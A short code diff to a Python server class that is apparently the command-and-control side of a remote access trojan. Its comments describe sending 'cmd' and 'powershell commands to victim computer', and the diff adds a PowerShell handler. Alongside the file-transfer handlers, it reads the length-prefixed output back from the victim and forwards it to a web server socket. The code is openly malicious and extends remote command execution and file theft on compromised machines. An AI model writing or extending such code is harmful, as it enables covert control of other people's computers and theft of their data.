@@ -163,12 +163,22 @@ class Server:
         if command.startswith('recv file'):
             self.receive_file_from_client("", sock)
 
-        # for sending mcd commands to victim computer
+        # for sending cmd commands to victim computer
         elif command.startswith("cmd"):
-            data = sock.recv(10000)
+            size = sock.recv(15).decode()
+            size = size.replace('$', '')
+            data = sock.recv(int(size))
             print(data.decode('utf-8', 'ignore'))
             self.web_server_socket.send(data)
 
+
+        # for sending powershell commands to victim computer
+        elif command.startswith("powershell"):
+            size = sock.recv(15).decode()
+            size = size.replace('$', '')
+            data = sock.recv(int(size))
+            print(data.decode('utf-8', 'ignore'))
+            self.web_server_socket.send(data)
 
 
         elif command.startswith("get files"):
